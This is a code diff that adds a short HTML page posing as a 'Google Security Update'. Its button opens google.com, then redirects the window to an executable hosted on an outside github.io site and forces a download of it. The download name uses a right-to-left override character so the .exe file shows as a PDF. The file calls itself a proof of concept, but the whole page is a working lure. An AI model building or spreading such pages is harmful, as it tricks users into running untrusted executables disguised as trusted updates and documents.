@@ -1,0 +1,28 @@
+<html>
+<head>
+    <title>Google Security Update</title>
+</head>
+<body>
+    <button onclick="startSpoof()">Install Google Security Update</button>
+
+    <script>
+        function startSpoof() {
+            const w = window.open('https://google.com', 'trusted');
+            
+            setTimeout(() => {
+                const spoofedName = "Google_Security_Update\u202Efdp.exe";
+                w.location.href = 'https://ryynx88.github.io/poc.exe';
+                
+                // Fallback untuk set nama file
+                setTimeout(() => {
+                    const a = document.createElement('a');
+                    a.href = 'https://ryynx88.github.io/poc.exe';
+                    a.download = spoofedName;
+                    a.click();
+                }, 1000);
+                
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
